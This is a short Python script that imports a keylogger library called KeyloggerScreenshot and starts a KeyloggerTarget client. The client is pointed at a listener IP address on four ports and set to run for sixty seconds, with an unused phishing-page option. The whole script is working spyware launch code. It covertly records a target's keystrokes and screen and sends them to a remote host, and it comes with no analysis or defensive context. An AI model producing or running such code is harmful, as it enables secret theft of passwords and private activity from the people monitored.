import KeyloggerScreenshot as ks 

ip = '172.20.10.3'
key_client = ks.KeyloggerTarget(ip, 1675, ip, 5497, ip, 8356, ip, 8341, duration_in_seconds=60, phishing_web=None) 
key_client.start()
